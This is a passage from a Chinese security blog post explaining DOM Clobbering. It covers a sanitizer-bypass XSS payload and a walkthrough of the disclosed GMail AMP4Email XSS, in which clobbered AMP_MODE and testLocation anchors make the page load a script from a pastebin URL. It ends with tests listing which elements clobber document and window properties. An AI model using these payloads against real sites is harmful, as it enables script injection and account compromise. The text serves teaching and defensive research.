treeWalker.nextSibling()));</span><br></pre></td></tr></table></figure><p>&#x7528;<code>_sanitized</code>&#x4F5C;&#x4E3A;&#x6807;&#x5FD7;&#x4F4D;&#x6765;&#x6807;&#x5FD7;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#xFF0C;&#x7531;&#x6211;&#x4EEC;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x4E0E;&#x4E0A;&#x4E2A;&#x4F8B;&#x5B50;&#x7C7B;&#x4F3C;&#x7684; payload &#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A; if &#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x4E86;&#x3002;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(document.domain)</span> <span class="hljs-attr">name</span>=<span class="hljs-string">_sanitized</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x662F;&#x5220;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x5B50;&#x6811;&#x5229;&#x7528;&#x9012;&#x5F52;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#x8FC7;&#x6EE4;&#x3002;</p><h3 id="XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering"><a href="#XSS-in-GMail&#x2019;s-AMP4Email-via-DOM-Clobbering" class="headerlink" title="XSS in GMail&#x2019;s AMP4Email via DOM Clobbering"></a>XSS in GMail&#x2019;s AMP4Email via DOM Clobbering</h3><p>&#x7EC8;&#x4E8E;&#x5230;&#x4E86;&#x6211;&#x4EEC;&#x5F00;&#x5934;&#x63D0;&#x5230;&#x7684; OWASP Top 10 &#x63D0;&#x540D;&#x7684;&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#x4E86;&#xFF0C;&#x4F5C;&#x8005;&#x9996;&#x5148;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5728;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165; window &#x8FDB;&#x884C; fuzz</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-7.png" alt></p><p>&#x8FD9;&#x91CC;&#x4ED6;&#x9996;&#x5148;&#x5229;&#x7528;&#x4E86;<code>AMP</code>&#xFF0C;&#x5C1D;&#x8BD5;&#x63D2;&#x5165;<code>&lt;a id=AMP&gt;</code>&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;<code>AMP</code>&#x88AB; ban &#x4E86;</p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-8.png" alt></p><p>&#x63A5;&#x7740;&#x627E;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;<code>AMP_MODE</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x88AB; ban &#xFF0C;&#x53CD;&#x800C;&#x8BA9;&#x4F5C;&#x8005;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x91CC;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#x7684; URL &#x5F53;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;<code>undefined</code></p><p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/11/image-9.png" alt></p><p>&#x8FD9;&#x5C31;&#x662F;&#x4F5C;&#x8005;&#x63D2;&#x5165;&#x4E86;<code>&lt;a id=AMP_MODE&gt;</code>&#x5BFC;&#x81F4;&#x4EA7;&#x751F;&#x7684;<code>undefined</code>&#xFF0C;&#x4E3B;&#x8981;&#x4EA7;&#x751F;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x7684;&#x4EE3;&#x7801;&#x7ECF;&#x4F5C;&#x8005;&#x7B80;&#x5316;&#x540E;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> loc;</span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.test &amp;&amp; <span class="hljs-built_in">window</span>.testLocation) {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.testLocation</span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-built_in">window</span>.location;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> (AMP_MODE.localDev) {</span><br><span class="line">    loc = loc.protocol + <span class="hljs-string">&quot;//&quot;</span> + loc.host + <span class="hljs-string">&quot;/dist&quot;</span></span><br><span class="line">} <span class="hljs-keyword">else</span> {</span><br><span class="line">    loc = <span class="hljs-string">&quot;https://cdn.ampproject.org&quot;</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">var</span> singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">b.src = loc + <span class="hljs-string">&quot;/rtv/&quot;</span> + AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> + singlePass + <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure><p>&#x4EE3;&#x7801;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5982;&#x679C;&#x518D;&#x8981;&#x7B80;&#x5316;&#x5230;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5C31;&#x662F;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> script = <span class="hljs-built_in">window</span>.document.createElement(<span class="hljs-string">&quot;script&quot;</span>);</span><br><span class="line">script.async = <span class="hljs-literal">false</span>;</span><br><span class="line"> </span><br><span class="line">b.src = <span class="hljs-built_in">window</span>.testLocation.protocol + <span class="hljs-string">&quot;//&quot;</span> +</span><br><span class="line">        <span class="hljs-built_in">window</span>.testLocation.host + <span class="hljs-string">&quot;/dist/rtv/&quot;</span> +</span><br><span class="line">        AMP_MODE.rtvVersion; + <span class="hljs-string">&quot;/&quot;</span> +</span><br><span class="line">        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + <span class="hljs-string">&quot;/&quot;</span> : <span class="hljs-string">&quot;&quot;</span>) +</span><br><span class="line">        <span class="hljs-string">&quot;v0/&quot;</span> + pluginName + <span class="hljs-string">&quot;.js&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="hljs-built_in">document</span>.head.appendChild(b);</span><br></pre></td></tr></table></figure><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x8BA9;&#x5B83;&#x52A0;&#x8F7D;&#x6211;&#x4EEC;&#x4EFB;&#x610F;&#x7684; js &#x6587;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x52AB;&#x6301;<code>protocol</code>&#x5230;&#x6211;&#x4EEC;&#x4EFB;&#x610F; URL&#xFF0C;&#x518D;&#x5229;&#x7528;<code>#</code>&#x6CE8;&#x91CA;&#x6389;&#x540E;&#x9762;&#x7684;&#x5373;&#x53EF;&#x3002;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localDev&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;AMP_MODE&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;testLocation&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;protocol&quot;</span></span></span><br><span class="line"><span class="hljs-tag">   <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://pastebin.com/raw/0tn8z0rG#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x867D;&#x7136; URL &#x6784;&#x9020;&#x51FA;&#x6765;&#x4E86;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x6709; CSP</p><figure class="highlight gams hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="hljs-string">&apos;none&apos;</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">script</span></span>-src <span class="hljs-string">&apos;sha512-oQwIl...==&apos;</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/rtv/</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0.js</span></span><br><span class="line">  https:<span class="hljs-comment">//cdn.ampproject.org/v0/</span></span><br></pre></td></tr></table></figure><p>&#x867D;&#x7136;&#x4ED6;&#x5F53;&#x65F6;&#x6CA1;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x662F; Google &#x8FD8;&#x662F;&#x5168;&#x989D;&#x5730;&#x7ED9;&#x4E86;&#x4ED6;&#x5956;&#x91D1;&#x3002;</p><p>&#x53E6;&#x5916;&#x8FD9;&#x4E2A; CSP &#x53EF;&#x4EE5;&#x5229;&#x7528;<code>..%252f</code>&#x7684; trick &#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x7531;&#x4E8E;&#x4E0D;&#x5C5E;&#x4E8E;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x7BC7;&#x5E45;&#x5173;&#x7CFB;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x5217;&#x4E3E;&#x66F4;&#x591A;&#x7684;&#x4F8B;&#x5B50;&#x4E86;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x6700;&#x8FD1;&#x81EA;&#x5DF1;&#x505A;&#x7684;&#x4E00;&#x4E9B; XSS Game &#x4E2D;&#x6D89;&#x53CA;&#x5230; Dom Clobbering &#x7684;&#x90E8;&#x5206;&#x4EE5; Tip &#x7684;&#x5F62;&#x5F0F;&#x5199;&#x51FA;&#x6765;&#x3002;</p><h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>&#x65E2;&#x7136;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x8FC7;&#x6216;&#x8BB8;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x67D0;&#x4E9B;&#x5C5E;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4E0D;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x6216;&#x8005;&#x8BF4;&#x5B8C;&#x5168;&#x63A7;&#x5236;<code>document.cookie</code>&#x5462;&#xFF1F;&#x7A76;&#x7ADF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x54EA;&#x4E9B;&#x5462;&#xFF1F;&#x53C8;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x5229;&#x7528;&#x5462;&#xFF1F;&#x54EA;&#x4E9B;&#x53EF;&#x4EE5;&#x7528; ID &#x54EA;&#x4E9B;&#x7528; Name&#x5462;&#xFF1F;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x54EA;&#x4E9B;&#x7528; id &#x54EA;&#x4E9B;&#x7528; name &#xFF1F;</p><h3 id="Document-amp-Id"><a href="#Document-amp-Id" class="headerlink" title="Document &amp; Id"></a>Document &amp; Id</h3><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x53EA;&#x6709;<code>object</code>&#x6807;&#x7B7E;<code>document</code>&#x53EF;&#x4EE5;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="Document-amp-Name"><a href="#Document-amp-Name" class="headerlink" title="Document &amp; Name"></a>Document &amp; Name</h3><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4EE5;&#x4E0B;&#x4E94;&#x4E2A;&#x5143;&#x7D20;&#x53EF;&#x4EE5;&#x8BA9;<code>document</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="Document-amp-Name-amp-Id"><a href="#Document-amp-Name-amp-Id" class="headerlink" title="Document &amp; Name &amp; Id"></a>Document &amp; Name &amp; Id</h3><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x name=y &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    <span class="hljs-built_in">document</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;y&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">document</span>.x != <span class="hljs-literal">undefined</span></span><br><span class="line">  ) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E0B;&#x4E09;&#x4E2A;&#x5143;&#x7D20;&#xFF1A;</p><figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="Window-amp-Id"><a href="#Window-amp-Id" class="headerlink" title="Window &amp; Id"></a>Window &amp; Id</h3><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...];<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> log = [];</span><br><span class="line"><span class="hljs-keyword">var</span> div = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; html.length; i++) {</span><br><span class="line">  div.innerHTML = <span class="hljs-string">&quot;&lt;&quot;</span> + html[i] + <span class="hljs-string">&quot; id=x &gt;&quot;</span>;</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>) &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    log.push(html[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log);</span><br></pre></td></tr></table></figure><p>&#x9664;&#x4E86;&#x5728; <a href="#Not Clobbered">Not Clobbered</a> &#x90E8;&#x5206;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x4ED6;&#x6807;&#x7B7E;<code>window</code>&#x5747;&#x53EF;&#x901A;&#x8FC7; id &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><figure class="highlight scheme hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-name">128</span>) [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;abbr&quot;</span>, <span class="hljs-string">&quot;acronym&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;applet&quot;</span>, <span class="hljs-string">&quot;area&quot;</span>, <span class="hljs-string">&quot;article&quot;</span>, <span class="hljs-string">&quot;aside&quot;</span>, <span class="hljs-string">&quot;audio&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;base&quot;</span>, <span class="hljs-string">&quot;basefont&quot;</span>, <span class="hljs-string">&quot;bdi&quot;</span>, <span class="hljs-string">&quot;bdo&quot;</span>, <span class="hljs-string">&quot;bgsound&quot;</span>, <span class="hljs-string">&quot;big&quot;</span>, <span class="hljs-string">&quot;blink&quot;</span>, <span class="hljs-string">&quot;blockquote&quot;</span>, <span class="hljs-string">&quot;br&quot;</span>, <span class="hljs-string">&quot;button&quot;</span>, <span class="hljs-string">&quot;canvas&quot;</span>, <span class="hljs-string">&quot;center&quot;</span>, <span class="hljs-string">&quot;cite&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;datalist&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;del&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>, <span class="hljs-string">&quot;dfn&quot;</span>, <span class="hljs-string">&quot;dialog&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-string">&quot;dl&quot;</span>, <span class="hljs-string">&quot;dt&quot;</span>, <span class="hljs-string">&quot;element&quot;</span>, <span class="hljs-string">&quot;em&quot;</span>, <span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;fieldset&quot;</span>, <span class="hljs-string">&quot;figcaption&quot;</span>, <span class="hljs-string">&quot;figure&quot;</span>, <span class="hljs-string">&quot;font&quot;</span>, <span class="hljs-string">&quot;footer&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;h1&quot;</span>, <span class="hljs-string">&quot;header&quot;</span>, <span class="hljs-string">&quot;hgroup&quot;</span>, <span class="hljs-string">&quot;hr&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;iframe&quot;</span>, <span class="hljs-string">&quot;iframes&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;ins&quot;</span>, <span class="hljs-string">&quot;isindex&quot;</span>, <span class="hljs-string">&quot;kbd&quot;</span>, <span class="hljs-string">&quot;keygen&quot;</span>, <span class="hljs-string">&quot;label&quot;</span>, <span class="hljs-string">&quot;legend&quot;</span>, <span class="hljs-string">&quot;li&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;listing&quot;</span>, <span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-string">&quot;map&quot;</span>, <span class="hljs-string">&quot;mark&quot;</span>, <span class="hljs-string">&quot;marquee&quot;</span>, <span class="hljs-string">&quot;menu&quot;</span>, <span class="hljs-string">&quot;menuitem&quot;</span>, <span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;meter&quot;</span>, <span class="hljs-string">&quot;multicol&quot;</span>, <span class="hljs-string">&quot;nav&quot;</span>, <span class="hljs-string">&quot;nextid&quot;</span>, <span class="hljs-string">&quot;nobr&quot;</span>, <span class="hljs-string">&quot;noembed&quot;</span>, <span class="hljs-string">&quot;noframes&quot;</span>, <span class="hljs-string">&quot;noscript&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>, <span class="hljs-string">&quot;ol&quot;</span>, <span class="hljs-string">&quot;optgroup&quot;</span>, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;picture&quot;</span>, <span class="hljs-string">&quot;plaintext&quot;</span>, <span class="hljs-string">&quot;pre&quot;</span>, <span class="hljs-string">&quot;progress&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;rp&quot;</span>, <span class="hljs-string">&quot;rt&quot;</span>, <span class="hljs-string">&quot;rtc&quot;</span>, <span class="hljs-string">&quot;ruby&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;samp&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>,&#xA0;&#x2026;]</span><br></pre></td></tr></table></figure><h3 id="Window-amp-Name"><a href="#Window-amp-Name" class="headerlink" title="Window &amp; Name"></a>Window &amp; Name</h3><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.x == <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&quot;x&quot;</span>)[<span class="hljs-number">0</span>] &amp;&amp; <span class="hljs-built_in">window</span>.x != <span class="hljs-literal">undefined</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x4E0E; document &#x4E00;&#x81F4;&#xFF0C;&#x53EA;&#x6709;&#x4E94;&#x4E2A;&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x8BA9;<code>window</code>&#x901A;&#x8FC7; name &#x8FDB;&#x884C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;</p><figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#xA0;[<span class="hljs-string">&quot;embed&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;image&quot;</span>, <span class="hljs-string">&quot;img&quot;</span>, <span class="hljs-string">&quot;object&quot;</span>]</span><br></pre></td></tr></table></figure><h3 id="&#x2018;Not-Clobbered&#x2019;"><a href="#&#x2018;Not-Clobbered&#x2019;" class="headerlink" title="&#x2018;Not Clobbered&#x2019;"></a>&#x2018;Not Clobbered&#x2019;</h3><figure class="highlight json hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">&quot;body&quot;</span>, <span 